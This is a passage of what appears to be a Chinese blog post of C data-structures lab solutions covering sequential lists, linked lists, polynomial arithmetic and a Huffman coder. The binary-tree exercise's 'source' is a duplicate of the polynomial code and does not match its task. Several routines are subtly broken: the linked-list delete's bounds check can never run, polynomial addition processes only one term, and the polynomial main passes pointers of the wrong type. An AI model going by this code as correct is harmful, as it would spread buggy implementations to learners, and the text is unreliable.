    int n;              //元素个数
    int maxlength;      //最大允许长度
    ElemType *element;  //指针变量
} SeqList;

typedef int Status; //自定义类型

//初始化
/*
为顺序表L动态分配一维数组
若动态分配一维数组失败则返回ERROR（0）
*/
Status Init(SeqList *L,int mSize)
{
    L-&gt;n=0;
    L-&gt;maxlength=mSize;
    L-&gt;element=(ElemType*)malloc(sizeof(ElemType)*mSize);
    if(!L-&gt;element)  
    {
        return ERROR;
    }
    return OK;
}

//顺序表的查找(查找元素ai的值,直接定位下标)
/*
首先判断传入的下标i是否越界（0~n-1）
若未越界，则取出element[i]的值传给x返回

算法复杂度为O(1)
*/
Status Find(SeqList L,int i,ElemType *x){
    if(i&lt;0||i&gt;L.n-1){
        return ERROR;    //判断元素下标i是否越界
    }
    *x=L.element[i];     //取出element[i]的值通过参数x返回
    return OK;
}


//顺序表的插入(在ai之后插入，即ai+1的位置)
/*
判断下标i是否越界 （-1~n-1）
判断顺序表存储空间是否已满
将元素ai+1~an-1依次向后移动一个位置
将要插入元素赋值给element[i+1]
表长+1

算法复杂度为O(n)
*/
Status Insert (SeqList *L, int i,ElemType x)
{
    int j;
     if(i&lt;-1||i&gt;L-&gt;n-1)  //注意此处i的范围 是&lt;-1 不是0  ！！！
    {
        return ERROR;
    }
    if(L-&gt;n==L-&gt;maxlength)   //判满
    {
        return ERROR;
    }
    for(j=L-&gt;n-1;j&gt;i;j--)       //通过循环将下标i+1到n-1的元素后移（从后往前）
    {
        L-&gt;element[j+1]=L-&gt;element[j];   //注意是j的值给j+1（从后往前）
    }
    L-&gt;element[i+1]=x; //把插入的 元素放到下标为 i+1 的位置
    L-&gt;n=L-&gt;n+1;      //表长加1
    return OK;
}


//顺序表的删除
/*
判断下标是否越界（0~n-1）
判断顺序表是否为空
将元素ai+1~an-1依次前移一个位置
表长-1

算法复杂度为O(n)
*/
Status Delete(SeqList *L,int i)
{
    int j;
    if(i&lt;0||i&gt;L-&gt;n-1)  return ERROR;  //此处i&lt;0!!!注意和插入区分
    if(!L-&gt;n)  return ERROR;    //判空
    for(j=i+1;j&lt;L-&gt;n;j++)
    {
        L-&gt;element[j-1]=L-&gt;element[j];  //从前往后逐个前移元素，j的值给j-1
    }
    L-&gt;n--;    //表长-1
    return OK;
    
}

//顺序表的输出
Status Output(SeqList *L)
{
    int i;
    if(!L-&gt;n)   return ERROR;   //判空
    for(i=0;i&lt;L-&gt;n;i++)
    {
        printf("%d  ",L-&gt;element[i]);
    }
    printf("\n\n");
     return OK;
}

//顺序表的销毁
void Destroy(SeqList *L)
{
    L-&gt;n=0;
    L-&gt;maxlength=0;
    free(L-&gt;element);
    printf("Sucessfuly Destroyed!\n");
}


int main()
{
    int i,j,k,x;
    int m, n;
    SeqList List;
    k=Init(&amp;List,100); //因为Init函数的形参是指针变量（地址），所以这里要用取地址符！！！
    printf("初始化状态：%d\n\n",k);   //测试返回值为 1
    for(i=0;i&lt;10;i++)
    {
        Insert(&amp;List,i-1,i);  //执行插入操作
    }
    Output(&amp;List);    // 0123456789
    printf("请输入需要插入的数的位置下标和值（中间以空格隔开）：\n");
    scanf("%d%d",&amp;m,&amp;n);
    Insert(&amp;List,m,n);
     printf("\n插入后的序列：\n");
    Output(&amp;List);
    printf("请输入需要查找的数的下标：\n");
    scanf("%d",&amp;j);
    Find(List,j,&amp;x);
    printf("\nThe value is : %d\n\n",x);  
    printf("请输入需要删除的数的下标：\n");
    scanf("%d",&amp;k);
    Delete(&amp;List,k);
    printf("\n删除后的序列：\n");
    Output(&amp;List); 
    Destroy(&amp;List);
    printf("\n");
    system("pause");
}
</code></pre>
<h3 id="2-带表头结点单链表的初始化、查找、插入、删除、输出、撤销、逆置、排序等操作"><a href="#2-带表头结点单链表的初始化、查找、插入、删除、输出、撤销、逆置、排序等操作" class="headerlink" title="2.带表头结点单链表的初始化、查找、插入、删除、输出、撤销、逆置、排序等操作"></a>2.带表头结点单链表的初始化、查找、插入、删除、输出、撤销、逆置、排序等操作</h3><pre><code class="line-numbers language-c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
typedef int ElemType;
typedef int Status;
#define ERROR 0
#define OK 1
 
typedef struct Node {      //结点的结构体
    ElemType element;      //结点的数据域
    struct Node * link;    //结点的指针域
}Node;
 
typedef struct headerlist{ //带表头结点的单链表结构体
    struct Node* head;     //表头结点
    int n;                 //元素个数
}HeaderList;
 
 
//带表头结点单链表的初始化
Status Init(HeaderList *h) {
    h-&gt;head=(Node*)malloc(sizeof(Node));   //生成表头结点
    if(!h-&gt;head){
        return ERROR;
    }
    h-&gt;head-&gt;link = NULL;                  //设置单链表为空表
    h-&gt;n = 0;
    return OK;
}
 
 
//带表头结点单链表的查找
/*
判断下标i是否越界 0~n-1
若未越界，则从头结点开始顺着单链表逐个结点查找
通过循环让p指向结点ai
将ai的值通过x返回
*/
Status Find(HeaderList *h,int i,ElemType *x){
    Node *p;
    int j;
    if(i&lt;0||i&gt;h-&gt;n-1){
        return ERROR;
    }
    p=h-&gt;head-&gt;link;
    for(j=0;j&lt;i;j++){
        p=p-&gt;link;
    }
    *x=p-&gt;element;
    return OK;
}
 
 
//带表头结点单链表的插入
/*
判断i是否越界 （-1~n-1）
查找ai,指针p指向此节点
生成一个新的结点q，将新结点的数据域置为x，指针q指向此结点
将q所指向的结点插入p所指的结点之后（注意不要断链）
单链表元素个数+1
*/
Status Insert(HeaderList *h, int i, ElemType x) {
    Node *p, *q;
    int j;
    if (i&lt;-1 || i&gt;h-&gt;n - 1)
        return ERROR;
    p = h-&gt;head;                          //从头结点开始找ai元素所在的结点p
    for (j = 0; j &lt;= i; j++) {
        p = p-&gt;link;
    }
    q = (Node*)malloc(sizeof(Node));      //生成新结点q
    q-&gt;element = x;
    q-&gt;link = p-&gt;link;                    //新结点q插在p之后
    p-&gt;link = q;
    h-&gt;n++;
    return OK;
}
 
 
//带表头结点单链表的删除
/*
判断i是否越界（0~n-1）、单链表是否为空
查找元素ai的直接前驱ai-1,并令指针q指向它
则使p指向ai所在的结点，并删除ai
释放p所指结点的存储空间
单链表元素个数-1
*/
Status Delete(HeaderList *h,int i){
    int j;
    Node *p,*q;
    if(!h-&gt;n){
        return ERROR;
        if(i&lt;0||i&gt;h-&gt;n-1){
            return ERROR;
        }
    }
    q=h-&gt;head;
    for(j=0;j&lt;i;j++){
        q=q-&gt;link;
    }
    p=q-&gt;link;                      //p指向ai
    q-&gt;link=p-&gt;link;                //从单链表中删除p所指结点
    free(p);                        //释放p所指结点的存储空间
    h-&gt;n--;
    return OK;
}
 
 
//带表头结点的输出操作
Status Output (HeaderList *h)
{
    Node*p;
    p = h-&gt;head;
    for(int i=0; i&lt;h-&gt;n; i++)
    {
        p = p-&gt;link;
        printf("%d  ",p-&gt;element);
    }
    printf("\n\n");
    return OK;
}
 
 
// //带表头结点单链表的撤销操作
// void Destroy(HeaderList *h){
//     Node *p,*q;
//     while(h-&gt;head-&gt;link){
//         q=h-&gt;head-&gt;link;
//         p=h-&gt;head-&gt;link-&gt;link;
//         free(h-&gt;head-&gt;link);
//         h-&gt;head=q;
//     }
//     printf("Sucessfully destroyed!\n");
// }
void Destroy (HeaderList *h)
{
    Node* p;
    while(h-&gt;n)
    {
        p = h-&gt;head-&gt;link-&gt;link;
        free(h-&gt;head-&gt;link);
        h-&gt;head-&gt;link = p;
        h-&gt;n -=1;
    }
    free(h-&gt;head);
    printf("Sucessfully Destroyed!\n");
}
 
 
//将带表头结点单链表逆置
void Reverse(HeaderList *h){
    Node *p,*q;
    p = h-&gt;head-&gt;link;            //p指向a0
    h-&gt;head-&gt;link = NULL;         //断开与表头结点的链接
    while(p){
        q=p-&gt;link;                //q指向p的下一个结点
        p-&gt;link=h-&gt;head-&gt;link;    
        h-&gt;head-&gt;link=p;          //这两步主要是将p指向的结点插到头结点后面
        p=q;                      //把下一个结点的地址给p（q的存在避免了断链）
    }
}

//将单链表排序成为有序单链表
void Sort(HeaderList *h)    //冒泡排序
{
    int temp;
    Node*p;  //定义p.q两个结点,p指向第一个结点，q指向p的下一个结点
    Node*q;
    for(p=h-&gt;head-&gt;link;p!=NULL;p=p-&gt;link)
    {
        for(q=p-&gt;link,temp=0;q!=NULL;q=q-&gt;link)
        {
            if(p-&gt;element &gt; q-&gt;element)   
            {
                temp = p-&gt;element;        
                p-&gt;element = q-&gt;element;    //如果p所指的结点的值大于q所指结点的值，则进行交换
                q-&gt;element = temp;        
            }
        }
    }
}


 //用于测试的主函数
int main()
{
    int i;
    int x;
    int m,n,j,k;
    HeaderList List;
    i=Init(&amp;List);
    printf("初始化状态：%d\n\n",i);     // 1
    for(i=0;i&lt;10;i++)
    {
        Insert(&amp;List,i-1,i);
    }
    Output(&amp;List);    //0 1 2 3 4 5 6 7 8 9
    printf("请输入需要插入的数的位置下标和值（中间以空格隔开）：\n");
    scanf("%d%d",&amp;m,&amp;n);
    Insert(&amp;List,m,n);
    printf("\n插入后的序列：\n");
    Output(&amp;List);
    Reverse(&amp;List);
    printf("逆置后的序列：\n");
    Output(&amp;List);
    printf("排序后的序列：\n");
    Sort(&amp;List);
    Output(&amp;List);
    printf("请输入需要查找的数的下标：\n");
    scanf("%d",&amp;j);
    Find(&amp;List,j,&amp;x);
    printf("The value is : %d\n\n",x);  
    printf("请输入需要删除的数的下标：\n");
    scanf("%d",&amp;k);
    Delete(&amp;List,k);
    printf("删除后的序列：\n");
    Output(&amp;List); 
    Destroy(&amp;List);
    return 0;
}
</code></pre>
<h3 id="3-一元多项式的创建、输出、撤销以及两个一元多项式相加和相乘"><a href="#3-一元多项式的创建、输出、撤销以及两个一元多项式相加和相乘" class="headerlink" title="3.一元多项式的创建、输出、撤销以及两个一元多项式相加和相乘"></a>3.一元多项式的创建、输出、撤销以及两个一元多项式相加和相乘</h3><pre><code class="line-numbers language-c">#include&lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef struct PNode
{
    int coef;
    int exp;
    struct PNode *link;
} PNode;
typedef struct Polynominal
{
    PNode *head;
} Polynominal;

void Create(Polynominal *p)
{
    PNode *pn, *pre, *q;
    p-&gt;head = (PNode*)malloc(sizeof(PNode));
    p-&gt;head-&gt;exp = -1;
    p-&gt;head-&gt;link = p-&gt;head;
    for (;;)
    {
        pn = (PNode*)malloc(sizeof(PNode));
        printf("coef\texp:\n");
        scanf("%d\t%d",&amp;pn-&gt;coef,&amp;pn-&gt;exp);
        if(pn-&gt;exp&lt;0)   //指数为负数时退出
            break;
        pre = p-&gt;head;
        q = p-&gt;head-&gt;link;
        while(q&amp;&amp;q-&gt;exp&gt;pn-&gt;exp)
        {
            pre = q;
            q = q-&gt;link;
        }
        pn-&gt;link = q;
        pre-&gt;link = pn;
    }
}

void Add(Polynominal *px,Polynominal *qx)
{
    PNode *q, *q1 = qx-&gt;head, *p, *p1, *temp;
    p = px-&gt;head-&gt;link;
    q = q1-&gt;link;
    while(p-&gt;exp&lt;q-&gt;exp)  //当p-&gt;exp&lt;q-&gt;exp,则q所指的项成为结果多项式中的一项，q1和q分别右移一项
    {
        q1 = q;
        q = q-&gt;link;
    }
    if(q-&gt;exp==p-&gt;exp)    //当p-&gt;exp==q-&gt;exp，将系数coef相加，但需要讨论相加后系数是否为零
    {
        q-&gt;coef = p-&gt;coef + q-&gt;coef;
        if(q-&gt;coef==0)   //相加后系数为0
        {
            q1-&gt;link = q-&gt;link;  //删除q
            free(q);             //释放q的空间
            q = q1-&gt;link;        //重置q指针
            p = p-&gt;link;         //p指针右移
        }
        else //相加后系数不为0
        {
            q1 = q;
            q = q-&gt;link;
            p = p-&gt;link;
        }
    }
    else  //当p-&gt;exp&lt;q-&gt;exp,则复制p所指向的结点，并将其插在q1之后，指针p右移一项
    {
        temp = (PNode*)malloc(sizeof(PNode));//以p的系数和指数生成新的结点
        temp-&gt;coef = p-&gt;coef;   
        temp-&gt;exp = p-&gt;exp;
        temp-&gt;link = q1-&gt;link;
        q1-&gt;link = temp;
        q1 = q1-&gt;link;
        p = p-&gt;link;
    }
}

//多项式的乘法
void Multiply(Polynominal *px,Polynominal *qx){
    Polynominal qx1,qx2;
    PNode *q1,*q2,*q3,*q4,*pre,*q;
    qx1.head = (PNode*)malloc(sizeof(PNode));       //生成新多项式qx1
    qx1.head-&gt;exp = -1;
    qx1.head-&gt;link = qx1.head;                      //qx1改造成循环链表
    q1 = px-&gt;head-&gt;link;                            //q1指向px的第一项
    q2 = qx-&gt;head-&gt;link;                            //q2指向qx的第一项
    while(q2-&gt;exp != -1){                           //当q2的指数不为-1时,px先和qx的每一项相乘
        q3 = (PNode*)malloc(sizeof(PNode));         //q3存放相乘的结果
        q3-&gt;coef = q1-&gt;coef * q2-&gt;coef;
        q3-&gt;exp = q1-&gt;exp + q2-&gt;exp;
        if(qx1.head-&gt;link-&gt;exp == -1){              //q3插入到qx1多项式第一项中
            q3-&gt;link = qx1.head-&gt;link;
            qx1.head-&gt;link = q3;
            pre = qx1.head-&gt;link;
        }
        else{                                       //q3插入到qx1多项式最后一项中
            q3-&gt;link = qx1.head;
            pre-&gt;link = q3;
            pre = pre-&gt;link;
        }
        q2 = q2-&gt;link;
    }
    q1 = q1-&gt;link;                                 //q1后移一位
    while(q1-&gt;exp != -1){                          //将px剩下来每一项和qx每一项相乘
        q2 = q2-&gt;link;
        qx2.head = (PNode*)malloc(sizeof(PNode));  //生成新多项式qx2
        qx2.head-&gt;exp = -1;
        qx2.head-&gt;link = qx2.head;
        while(q2-&gt;exp != -1){       
            q4 = (PNode*)malloc(sizeof(PNode));
            q4-&gt;coef = q1-&gt;coef * q2-&gt;coef;
            q4-&gt;exp = q1-&gt;exp + q2-&gt;exp;
            if(qx2.head-&gt;link-&gt;exp == -1){
                q4-&gt;link = qx2.head-&gt;link;
                qx2.head-&gt;link = q4;
                pre = qx2.head-&gt;link;
            }
            else{
                q4-&gt;link = qx2.head;
                pre-&gt;link = q4;
                pre = pre-&gt;link;
            }
            q2 = q2-&gt;link;
        }
        Add(&amp;qx2,&amp;qx1);                            //利用加法合并同类项
        q1 = q1-&gt;link;
    }
    Output(qx1);
}
 
void Output(Polynominal p){
    PNode *q;
    int flag = 1;                                   //记录是否为第一项
    q = p.head-&gt;link;
    if (!q){
        return;
    }
    while(q != p.head){
        if (!flag &amp;&amp; (q-&gt;coef &gt; 0)) printf("+");    //在非第一项的正系数前输出+号
        flag = 0;                                   //flag置为0,表示不是第一项
        if(q-&gt;coef == 0){                           //当前项系数为0
            return;
        }
        printf("%d",q-&gt;coef);                       //当前项系数不为0
        switch(q-&gt;exp){                             //判断当前项指数
            case 0:break;                           //当前项指数为0,退出
            case 1:printf("X");break;               //当前项指数为1,输出X
            default:printf("X^%d",q-&gt;exp);break;    //当前项指数不为0,也不为1
        }
        q = q-&gt;link;
    }
}
 

  int main()
    {
        Polynominal *p,*q;
        int x;
        printf("Please enter the first polynomial:\n");
        Create(&amp;p);
        Output(p);
        printf("\n\nPlease enter the second polynomial:\n");
        Create(&amp;q);
        Output(q);
        printf("\n\nPlease choose the function:(0：ADD；1：MULTIPLY)\n");
        scanf("%d",&amp;x);
        switch(x){                                  
            case 0:printf("Add Result:\n");
                Add(&amp;p,&amp;q);
                Output(q);
            break;
            case 1:printf("Multiply Result:\n");
                Multiply(&amp;p,&amp;q);
                Output(q);
            default:break;
        }
        return 0;
        
    }
</code></pre>
<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><h3 id="1-二叉树的基本操作"><a href="#1-二叉树的基本操作" class="headerlink" title="1.二叉树的基本操作"></a>1.二叉树的基本操作</h3><p>a) 已知二叉树二叉链表结点结构定义如下：</p>
<pre><code class="line-numbers language-c">typedef struct btnode

{

  ElemType element;

  struct btnode *lChild;

  struct btnode *rChild;

} BTNode;
</code></pre>
<p>参照程序5.1~5.4，编写程序，完成二叉树的先序创建、先序遍历、中序遍历、后序遍历等操作。</p>
<p>b)基于上一实验内容中构建的二叉链表存储结构，编写程序实现求二叉树结点个数、叶结点个数、二叉树的高度以及交换二叉树所有子树的操作。</p>
<p><strong>源码：</strong></p>
<pre><code class="line-numbers language-c">#include&lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef struct PNode
{
    int coef;
    int exp;
    struct PNode *link;
} PNode;
typedef struct Polynominal
{
    PNode *head;
} Polynominal;

void Create(Polynominal *p)
{
    PNode *pn, *pre, *q;
    p-&gt;head = (PNode*)malloc(sizeof(PNode));
    p-&gt;head-&gt;exp = -1;
    p-&gt;head-&gt;link = p-&gt;head;
    for (;;)
    {
        pn = (PNode*)malloc(sizeof(PNode));
        printf("coef\texp:\n");
        scanf("%d\t%d",&amp;pn-&gt;coef,&amp;pn-&gt;exp);
        if(pn-&gt;exp&lt;0)   //指数为负数时退出
            break;
        pre = p-&gt;head;
        q = p-&gt;head-&gt;link;
        while(q&amp;&amp;q-&gt;exp&gt;pn-&gt;exp)
        {
            pre = q;
            q = q-&gt;link;
        }
        pn-&gt;link = q;
        pre-&gt;link = pn;
    }
}

void Add(Polynominal *px,Polynominal *qx)
{
    PNode *q, *q1 = qx-&gt;head, *p, *p1, *temp;
    p = px-&gt;head-&gt;link;
    q = q1-&gt;link;
    while(p-&gt;exp&lt;q-&gt;exp)  //当p-&gt;exp&lt;q-&gt;exp,则q所指的项成为结果多项式中的一项，q1和q分别右移一项
    {
        q1 = q;
        q = q-&gt;link;
    }
    if(q-&gt;exp==p-&gt;exp)    //当p-&gt;exp==q-&gt;exp，将系数coef相加，但需要讨论相加后系数是否为零
    {
        q-&gt;coef = p-&gt;coef + q-&gt;coef;
        if(q-&gt;coef==0)   //相加后系数为0
        {
            q1-&gt;link = q-&gt;link;  //删除q
            free(q);             //释放q的空间
            q = q1-&gt;link;        //重置q指针
            p = p-&gt;link;         //p指针右移
        }
        else //相加后系数不为0
        {
            q1 = q;
            q = q-&gt;link;
            p = p-&gt;link;
        }
    }
    else  //当p-&gt;exp&lt;q-&gt;exp,则复制p所指向的结点，并将其插在q1之后，指针p右移一项
    {
        temp = (PNode*)malloc(sizeof(PNode));//以p的系数和指数生成新的结点
        temp-&gt;coef = p-&gt;coef;   
        temp-&gt;exp = p-&gt;exp;
        temp-&gt;link = q1-&gt;link;
        q1-&gt;link = temp;
        q1 = q1-&gt;link;
        p = p-&gt;link;
    }
}

//多项式的乘法
void Multiply(Polynominal *px,Polynominal *qx){
    Polynominal qx1,qx2;
    PNode *q1,*q2,*q3,*q4,*pre,*q;
    qx1.head = (PNode*)malloc(sizeof(PNode));       //生成新多项式qx1
    qx1.head-&gt;exp = -1;
    qx1.head-&gt;link = qx1.head;                      //qx1改造成循环链表
    q1 = px-&gt;head-&gt;link;                            //q1指向px的第一项
    q2 = qx-&gt;head-&gt;link;                            //q2指向qx的第一项
    while(q2-&gt;exp != -1){                           //当q2的指数不为-1时,px先和qx的每一项相乘
        q3 = (PNode*)malloc(sizeof(PNode));         //q3存放相乘的结果
        q3-&gt;coef = q1-&gt;coef * q2-&gt;coef;
        q3-&gt;exp = q1-&gt;exp + q2-&gt;exp;
        if(qx1.head-&gt;link-&gt;exp == -1){              //q3插入到qx1多项式第一项中
            q3-&gt;link = qx1.head-&gt;link;
            qx1.head-&gt;link = q3;
            pre = qx1.head-&gt;link;
        }
        else{                                       //q3插入到qx1多项式最后一项中
            q3-&gt;link = qx1.head;
            pre-&gt;link = q3;
            pre = pre-&gt;link;
        }
        q2 = q2-&gt;link;
    }
    q1 = q1-&gt;link;                                 //q1后移一位
    while(q1-&gt;exp != -1){                          //将px剩下来每一项和qx每一项相乘
        q2 = q2-&gt;link;
        qx2.head = (PNode*)malloc(sizeof(PNode));  //生成新多项式qx2
        qx2.head-&gt;exp = -1;
        qx2.head-&gt;link = qx2.head;
        while(q2-&gt;exp != -1){       
            q4 = (PNode*)malloc(sizeof(PNode));
            q4-&gt;coef = q1-&gt;coef * q2-&gt;coef;
            q4-&gt;exp = q1-&gt;exp + q2-&gt;exp;
            if(qx2.head-&gt;link-&gt;exp == -1){
                q4-&gt;link = qx2.head-&gt;link;
                qx2.head-&gt;link = q4;
                pre = qx2.head-&gt;link;
            }
            else{
                q4-&gt;link = qx2.head;
                pre-&gt;link = q4;
                pre = pre-&gt;link;
            }
            q2 = q2-&gt;link;
        }
        Add(&amp;qx2,&amp;qx1);                            //利用加法合并同类项
        q1 = q1-&gt;link;
    }
    Output(qx1);
}
 
void Output(Polynominal p){
    PNode *q;
    int flag = 1;                                   //记录是否为第一项
    q = p.head-&gt;link;
    if (!q){
        return;
    }
    while(q != p.head){
        if (!flag &amp;&amp; (q-&gt;coef &gt; 0)) printf("+");    //在非第一项的正系数前输出+号
        flag = 0;                                   //flag置为0,表示不是第一项
        if(q-&gt;coef == 0){                           //当前项系数为0
            return;
        }
        printf("%d",q-&gt;coef);                       //当前项系数不为0
        switch(q-&gt;exp){                             //判断当前项指数
            case 0:break;                           //当前项指数为0,退出
            case 1:printf("X");break;               //当前项指数为1,输出X
            default:printf("X^%d",q-&gt;exp);break;    //当前项指数不为0,也不为1
        }
        q = q-&gt;link;
    }
}
 

  int main()
    {
        Polynominal *p,*q;
        int x;
        printf("Please enter the first polynomial:\n");
        Create(&amp;p);
        Output(p);
        printf("\n\nPlease enter the second polynomial:\n");
        Create(&amp;q);
        Output(q);
        printf("\n\nPlease choose the function:(0：ADD；1：MULTIPLY)\n");
        scanf("%d",&amp;x);
        switch(x){                                  
            case 0:printf("Add Result:\n");
                Add(&amp;p,&amp;q);
                Output(q);
            break;
            case 1:printf("Multiply Result:\n");
                Multiply(&amp;p,&amp;q);
                Output(q);
            default:break;
        }
        return 0;
        
    }
</code></pre>
<h3 id="2-哈夫曼编码-译码系统的实现"><a href="#2-哈夫曼编码-译码系统的实现" class="headerlink" title="2.哈夫曼编码/译码系统的实现"></a>2.哈夫曼编码/译码系统的实现</h3><p>   已知哈夫曼树结点结构定义如下：</p>
<pre><code class="line-numbers language-CC">typedef struct hfmTNode   //哈夫曼树结点结构体       

{

  ElemeTypeBefore element; //结点的数据域

  int w;          //结点的权值

  struct hfmTNode* lChild; //结点的左孩子指针

  struct hfmTNode* rChild; //结点的右孩子指针

}HFMTnode;
</code></pre>
<p>编写程序，实现哈夫曼树的创建、哈夫曼编码及解码的实现。</p>
<p><strong>源码：</strong></p>
<pre><code class="line-numbers language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdbool.h&gt;
#include&lt;string.h&gt;
typedef char ElemeTypeBefore;
typedef struct hfmTNode      //哈夫曼树结点结构体             
{
    ElemeTypeBefore element;  //结点的数据域
    int w;                    //结点的权值
    struct hfmTNode* lChild;  //结点的左孩子指针
    struct hfmTNode* rChild;  //结点的右孩子指针
}HFMTnode;
typedef struct hfmTree       //哈夫曼树结构体
{
    hfmTNode* root;
}HFMTree;
typedef HFMTree ElemeType;
typedef struct priorityQueue  //优先权队列结构体
{
    ElemeType *element;
    int n;
    int maxSize;
}PriorityQueue;

char res[50];
//创建一个优先权队列
void CreatPQ(PriorityQueue* PQ, int mSize)
{
    PQ-&gt;maxSize = mSize;
    PQ-&gt;n = 0;
    PQ-&gt;element = (ElemeType*)malloc(mSize*sizeof(ElemeType));
}

//销毁一个优先权队列
void Destroy(PriorityQueue* PQ)
{
    free(PQ-&gt;element);
    PQ-&gt;n = 0;
    PQ-&gt;maxSize = 0;
}
//判空
bool IsEmpty(PriorityQueue* PQ)
{
    if(PQ-&gt;n == 0) return true;
    return false;
}
//判满
bool IsFull(PriorityQueue* PQ)
{
    if(PQ-&gt;n == PQ-&gt;maxSize) return true;
    return false;
}

//向上调整
void AdjustUp(ElemeType heap[], int current)
{
    int p = current; 
    ElemeType temp;
    while(p&gt;0)
    {
        if(heap[p].root-&gt;w&lt;heap[(p-1)/2].root-&gt;w)
        {
            temp = heap[p];
            heap[p] = heap[(p-1)/2];
            heap[(p-1)/2] = temp;
            p = (p-1)/2;
        }
        else break;
    }
}

//在优先权队列中添加一个新元素x
void Append(PriorityQueue* PQ, ElemeType x)
{
    if(IsFull(PQ)) return;
    PQ-&gt;element[PQ-&gt;n] = x;
    PQ-&gt;n++;
    AdjustUp(PQ-&gt;element,(PQ-&gt;n)-1);
}

//向下调整
void AdjustDown(ElemeType heap[],int current,int n)
{
    int i = current;
    ElemeType temp;
    while(2*i+1&lt;n)
    {
        if(heap[i].root-&gt;w&gt;heap[2*i+1].root-&gt;w)
        {
            temp = heap[i];
            heap[i] = heap[2*i+1];
            heap[2*i+1] = temp;
            i = 2*i+1;
        }
        else break;
    }
}

//取出堆顶哈夫曼结点并赋值给x
void Serve(PriorityQueue* PQ, ElemeType* x)
{
    if(IsEmpty(PQ)) return;
    *x = PQ-&gt;element[0];
    PQ-&gt;n--;
    PQ-&gt;element[0] = PQ-&gt;element[PQ-&gt;n];
    AdjustDown(PQ-&gt;element, 0, PQ-&gt;n);
}

//新建一个哈夫曼结点
HFMTnode* NewNode(ElemeTypeBefore x, HFMTree* ln, HFMTree* rn, int w)
{
    HFMTnode* p =(HFMTnode*)malloc(sizeof(HFMTnode));
    p-&gt;element = x;
    if(ln)p-&gt;lChild = ln-&gt;root;else p-&gt;lChild = NULL;
    if(rn)p-&gt;rChild = rn-&gt;root;else p-&gt;rChild = NULL;
    p-&gt;w = w;
    return p;
}

//建树
void MakeHFMTree(HFMTree *bt, ElemeTypeBefore e, HFMTree *left, HFMTree *right, int w)
{
    bt-&gt;root = NewNode(e, left, right, w);
    if(bt-&gt;root || left == right)
        return;
    left-&gt;root = right-&gt;root = NULL; //root属于指针，置NULL可以减少内存使用
}

//创建哈夫曼树
HFMTree CreatHFMTree(int w[],char c[],int m)
{
    PriorityQueue PQ;       //定义优先权队列PQ，用于存放二叉树根结点指针
    HFMTree x,y,z;          //x,y,z为哈夫曼树变量
    CreatPQ(&amp;PQ,m);         //初始化优先权队列PQ
    for(int i=0; i&lt;m; i++)
    {
        MakeHFMTree(&amp;x,c[i],NULL,NULL,w[i]);       //创建仅包含根结点的二叉树，w[i]为权值，c[i]为字符
        Append(&amp;PQ,x);         //将新创建的二叉树插入优先权队列
    }
    while (PQ.n&gt;1)
    {
        Serve(&amp;PQ,&amp;x);                //从PQ中取出根结点值最小和次小的二叉树，分别存入x和y
        Serve(&amp;PQ,&amp;y);
        if(x.root-&gt;w&gt;y.root-&gt;w)       //设置左子树根结点的权值小于右子树
        MakeHFMTree(&amp;z,'#',&amp;y,&amp;x,x.root-&gt;w+y.root-&gt;w);
        else
        MakeHFMTree(&amp;z,'#',&amp;x,&amp;y,x.root-&gt;w+y.root-&gt;w);
        Append(&amp;PQ,z);       //将和并生成的新二叉树z插入优先权队列
    }
    Serve(&amp;PQ,&amp;x);   //获取优先权队列中唯一的一棵二叉树，存入x，该二叉树即为哈夫曼树
    return x;
}

//先序遍历
void PreOrderTree(HFMTnode *t){
    if(t==NULL){
        return;
    }
    printf("%c%d\t",t-&gt;element,t-&gt;w);  //打印输出根结点，此处可以定义其他操作
    PreOrderTree(t-&gt;lChild);  //然后先序遍历左子树
    PreOrderTree(t-&gt;rChild);  //最后先序遍历右子树
}

//中序遍历
void InOrderTree(HFMTnode *t){
    if(t==NULL){
        return;
    }
    InOrderTree(t-&gt;lChild);  //中序遍历根结点的左子树
    printf("%c%d\t",t-&gt;element,t-&gt;w); //打印输出根结点，此处可以定义其他操作
    InOrderTree(t-&gt;rChild);  //最后中序遍历根结点的右子树
}

//哈夫曼编码
void Encode(HFMTnode *root,int level)        
{
    
    if(root-&gt;rChild==root-&gt;lChild)        
    {
        if(level==0)          //根结点         
        {
            res[0]='0';
            level++;
        }
        res[level]='\0';     //结束字符串            
        printf("%c =&gt; %s\n",root-&gt;element,res);
    }
    else
    {
        res[level]='0';                
        Encode(root-&gt;lChild,level+1);
        res[level]='1';                
        Encode(root-&gt;rChild,level+1);
    }
}

//解码
void Decode(HFMTnode *root, char a[])
{
    int i,j;
    HFMTnode *temp;               //用来存放根结点，因为后续要重新从根结点进行匹配
    temp = root;
    int Len = strlen(a);          //获取码文长度
    for (i = 0; i &lt; Len;i++)
    {
        if(a[i]=='0')              //扫描到0则向根结点的左子树前进
        {
            if(root-&gt;lChild!=NULL)
            {
                root = root-&gt;lChild;
            }
        }else if (a[i]=='1')        //扫描到1则向根结点的有子树前进
        {
            if(root-&gt;rChild!=NULL)
            {
                root = root-&gt;rChild;
            }
        }
        if(root-&gt;lChild==NULL&amp;&amp;root-&gt;rChild==NULL)  //当匹配到的是叶子结点
        {
            printf("%c",root-&gt;element);             //输出对应字符
            root = temp;                            //回到根结点
        } 
    }
    printf("\n");
   
}


int main()
{
    HFMTree x;
    int m,i;
    int w[50];   //权值集
    char c[50];  //字符集
    char res[50];
    char array[50];
    printf("Please enter the number of characters:\n");
    scanf("%d",&amp;m);
    for (i = 0; i &lt; m;i++)
    {
    printf("Please enter %dth characters and weights (separated by commas):\n",i+1);
    scanf(" %c,%d",&amp;c[i],&amp;w[i]);
    }
    x = CreatHFMTree(w,c,m);
    printf("\n PreOrderHFMTree:\n");
    PreOrderTree(x.root);            //通过先序遍历和中序遍历的结果就可以画出这棵哈夫曼树
    printf("\n InOrderHFMTree:\n");
    InOrderTree(x.root);
    printf("\n\nAfter Huffman coding:\n");
    Encode(x.root,0);
    printf("\nPlease enter the code text:\n");
    scanf("%s",array);
    printf("\nDecoding is:\n");
    Decode(x.root,array);
    return 0;
}
</code></pre>
